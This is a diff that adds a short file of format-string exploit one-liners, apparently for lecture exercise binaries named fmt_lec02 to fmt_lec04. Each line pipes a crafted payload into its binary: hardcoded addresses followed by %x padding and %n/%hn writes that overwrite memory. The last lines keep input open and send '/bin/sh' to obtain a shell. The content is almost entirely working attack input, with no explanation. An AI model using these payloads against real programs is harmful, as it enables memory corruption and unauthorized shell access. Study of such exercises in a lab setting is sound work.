@@ -1,0 +1,4 @@
+fmt_lec02: python -c 'print "\x14\xf6\xff\xbf"+"%x."*4+"%x%n"' | ./fmt_lec02
+fmt_lec03: python -c 'print "\x14\xf6\xff\xbfAAAA\x16\xf6\xff\xbf"+"%08x."*4+"%47758x%hn%4160x%hn"' | ./fmt_lec03; echo
+fmt_lec04: (python -c 'print "\x0c\xa0\x04\x08BBBB\x0e\xa0\x04\x08" + "%08x."*4 + "%12640x%hn%34390x%hn"'; cat) | ./fmt_lec04
+fmt_lec04: (python -c 'print "\x0c\xa0\x04\x08BBBB\x0e\xa0\x04\x08" + "%08x."*4 + "%12640x%hn%34390x%hn"; print "/bin/sh"'; cat) | ./fmt_lec04
